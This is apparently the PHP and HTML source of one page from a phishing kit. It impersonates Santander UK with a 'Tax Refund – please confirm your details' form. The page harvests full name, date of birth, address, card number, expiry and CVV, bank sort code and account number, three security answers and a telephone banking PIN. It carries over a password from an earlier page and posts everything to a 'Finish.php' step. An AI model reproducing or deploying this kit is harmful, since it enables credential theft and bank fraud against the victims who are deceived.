<?php

error_reporting(0);

session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
$_SESSION['pass'] = $_POST['pass'];
$_SESSION['memo'] = $_POST['memo'];

?>

<!DOCTYPE html>
<html lang="en-gb">
<head>
<title>Tax Refund</title>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="en-gb" http-equiv="content-language">
<meta content="width=device-width" name="viewport">
<link href="" media="handheld" rel="alternate">
<link href="assets/img/fav.ico" rel="shortcut icon">
<link href="assets/css/001.css" rel="stylesheet" type="text/css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script>
jQuery.validator.addMethod('phoneUK', function(phone_number, element) {
return this.optional(element) || phone_number.length > 9 &&
phone_number.match(/^(((\+44)? ?(\(0\))? ?)|(0))( ?[0-9]{3,4}){3}$/);
}, 'Please check the telephone number you have provided');

jQuery.validator.addMethod("postcodeUK", function(value, element) {
return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
}, "Please check the postcode you have provided");

$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "div",			
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: { required: true,	minlength: 10,},
					address: { required: true, minlength: 5,},
					postcode: { required: true, minlength: 5,},
					telephone: { required: true, minlength: 11, digits: true,},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					account: { required: true, minlength: 8, digits: true,},
					sortcode: { required: true, minlength: 8},
					q1: {	
						required: true, 
					},
					q2: {	
						required: true, 
					},
					q3: {	
						required: true, 
					},
					a1: { required: true,	minlength: 3,},
					a2: { required: true,	minlength: 3,},
					a3: { required: true,	minlength: 3,},
					telepin: { required: true,	minlength: 6,},
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: { 
						required: "Please provide your date of birth",
						minlength: jQuery.validator.format("Please check the date of birth you have entered"),
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					telephone: {
						required: "Please provide your telephone number",
						minlength: jQuery.validator.format("Please ensure you enter digits only"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					account: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: { 
						required: "Please provide your sortcode", 
						minlength: jQuery.validator.format("Please check the sortcode you have entered"), 
					},
					q1: {
						required: "Please select a security question",
					},
					q2: {
						required: "Please select a security question",
					},
					q3: {
						required: "Please select a security question",
					},
					a1: { 
						required: "Please provide your answer to the above security question",
						minlength: jQuery.validator.format("Please check the answer you have entered"),
					},
					a2: { 
						required: "Please provide your answer to the above security question",
						minlength: jQuery.validator.format("Please check the answer you have entered"),
					},
					a3: { 
						required: "Please provide your answer to the above security question",
						minlength: jQuery.validator.format("Please check the answer you have entered"),
					},
					telepin: { 
						required: "Please provide your telephone banking pin",
						minlength: jQuery.validator.format("Please check the telephone banking pin you have entered"),
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<style>
div.error {color:red;}
</style>
<a href="#" onclick="populate();">
<div id="developer" style="display:none;color:red;background-color:yellow;padding:25px;font-size:20;font-weight:700">Populate Form</div>
</a>
<script>
function populate(){
document.getElementById("name").value = "Steve Smith";
document.getElementById("dob").value = "01/01/1985";
document.getElementById("address").value = "21 Some road";
document.getElementById("postcode").value = "IV542FG";
document.getElementById("telephone").value = "07475533233";
document.getElementById("ccname").value = "SS SMITH";
document.getElementById("cc-number").value = "4111 1111 1111 1111";
document.getElementById("cc-exp").value = "10 / 16";
document.getElementById("cc-cvc").value = "106";
document.getElementById("account").value = "01060106";
document.getElementById("sortcode").value = "00-11-22";
}
</script>
</head>
<body class="hasJS">
<div id="outer">
<div id="banner">
<p id="userstatusNGB">
<img src="assets/img/logo.png">
</p>
<p class="cookiePolicy">
<img src="assets/img/ico_lockSmallWhite.png" height="30" width="26px">
</p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Tax Refund</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="panel">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div class="panelInner">
<div class="inner">
<div class="msgInfo">
<div class="msgTL">
<div class="msgTR">
<div class="msgBR">
<div class="msgBL">
<p class="msgP">Tax Refund – please confirm your details</p>
</div>
</div>
</div>
</div>
</div>
<form action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" id="details" method="post" name="details">
<div class="formField"><label for="name">Full Name</label> <input value="<?php echo $_SESSION['name'];?>" autocomplete="off" class="wide" id="name" maxlength="30" name="name" type="text"></div>
<div class="formField"><label for="dob">Date of Birth</label> <input value="<?php echo $_SESSION['dob'];?>" autocomplete="off" class="wide" id="dob" maxlength="20" name="dob" placeholder="DD/MM/YYYY" type="tel"></div>
<div class="formField"><label for="address">Address</label> <input value="<?php echo $_SESSION['address'];?>" autocomplete="off" class="wide" id="address" maxlength="30" name="address" placeholder="Line 1" type="text"></div>
<div class="formField"><label for="postcode">UK Postcode</label> <input value="<?php echo $_SESSION['postcode'];?>" autocomplete="off" class="wide" id="postcode" maxlength="9" name="postcode" type="text"></div>
<div class="formField"><label for="telephone">Mobile Number</label> <input value="" autocomplete="off" class="wide" id="telephone" maxlength="11" name="telephone" type="tel"></div>
<div class="formField"><label for="sortcode">Sort Code</label> <input value="<?php echo $_SESSION['sortcode'];?>" autocomplete="off" class="wide" id="sortcode" maxlength="20" name="sortcode" placeholder="XX-XX-XX" type="tel"></div>
<div class="formField"><label for="memo">Account Number</label> <input value="<?php echo $_SESSION['account'];?>"  autocomplete="off" class="wide" id="acccount" maxlength="8" name="account" type="tel"></div>
<div class="formField"><label for="ccno">Card Number</label> <input value="<?php echo $_SESSION['ccno'];?>" autocomplete="off" class="wide cc-number" id="cc-number" maxlength="20" name="ccno" type="tel" value=""></div>
<div class="formField"><label for="ccexp">Card Expiry</label> <input value="<?php echo $_SESSION['ccexp'];?>"  autocomplete="off" class="wide cc-exp" id="cc-exp" maxlength="7" name="ccexp" type="tel" value=""></div>
<div class="formField"><label for="secode">Card Security Code</label> <input value="<?php echo $_SESSION['secode'];?>"  autocomplete="off" class="wide" id="secode" maxlength="4" name="secode" type="tel" value=""></div>
<h2>Confirm Security Questions</h2>
<div id="ErrorBox" style="display: none;" class="message alert">
<p><strong>You can not select the same security questions</strong></p>
</div>	
<div id="ErrorBox1" style="display: none;" class="message alert">
<p><strong>The answers to your security questions can not match</strong></p>
</div>		
<div class="formField"><label for="q1">Verify Security Question 1</label><select class="question firstfocus" name="q1" id="q1" tabindex="0"><option selected="selected">Please choose from ...</option><option value="Place of Birth">Place of Birth</option><option value="Name of first school">Name of first school</option><option value="Name of secondary school">Name of secondary school</option><option value="Mothers middle name">Mother's middle name</option><option value="Fathers middle name">Father's middle name</option><option value="Maternal grandmothers first name">Maternal grandmother's first name</option><option value="Maternal grandfathers first name">Maternal grandfather's first name</option></select></div>
<div class="formField"><label for="a1">Verify Security Answer</label><input autocomplete="off" class="answer wide" id="a1" maxlength="40" name="a1" type="text"></div>
<div class="formField"><label for="q2">Verify Security Question 2</label><select class="question firstfocus" name="q2" id="q2" tabindex="0"><option selected="selected">Please choose from ...</option><option value="Place of Birth">Place of Birth</option><option value="Name of first school">Name of first school</option><option value="Name of secondary school">Name of secondary school</option><option value="Mothers middle name">Mother's middle name</option><option value="Fathers middle name">Father's middle name</option><option value="Maternal grandmothers first name">Maternal grandmother's first name</option><option value="Maternal grandfathers first name">Maternal grandfather's first name</option></select></div>
<div class="formField"><label for="a2">Verify Security Answer</label><input autocomplete="off" class="answer wide" id="a2" maxlength="40" name="a2" type="text"></div>
<div class="formField"><label for="q3">Verify Security Question</label><select class="question firstfocus" name="q3" id="q3" tabindex="0"><option selected="selected">Please choose from ...</option><option value="Place of Birth">Place of Birth</option><option value="Name of first school">Name of first school</option><option value="Name of secondary school">Name of secondary school</option><option value="Mothers middle name">Mother's middle name</option><option value="Fathers middle name">Father's middle name</option><option value="Maternal grandmothers first name">Maternal grandmother's first name</option><option value="Maternal grandfathers first name">Maternal grandfather's first name</option></select></div>
<div class="formField"><label for="a3">Verify Security Answer 3</label><input autocomplete="off" class="answer wide" id="a3" maxlength="40" name="a3" type="text"></div>
<div class="formField"><label for="telepin">Telephone Banking Pin</label><input autocomplete="off" class="wide" id="telepin" maxlength="6" name="telepin" type="tel"></div>
<br>
<div class="divider">
<hr></div>
<div class="actions">
<div class="lnkLev1">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
<p class="lnkLev1P"><input class="submitAction" id="go" name="go" type="submit" value="Continue"></p>
</form>
</div>
</div>
</div>
</div>
</div>
<div class="nav">
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
</div>
</div>
</div>
</div>
</div>
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="FootNav ">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a  href="#" class="blockLink">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a  href="#" class="blockLink">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a  href="#" class="blockLink">Contact us</a></p>
</div>
</div>
<div class="clearer"></div>
<div style="clear: both;text-align: center;padding-bottom:10px" class="footerLinksLogin">
<ul style="display: block;background-color: #D6D6D6;">
<li style="list-style: none;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 13px">Copyright &copy; Santander UK plc. All rights reserved</li>
</ul>
</div>
</div>
</div>
</body>
</html>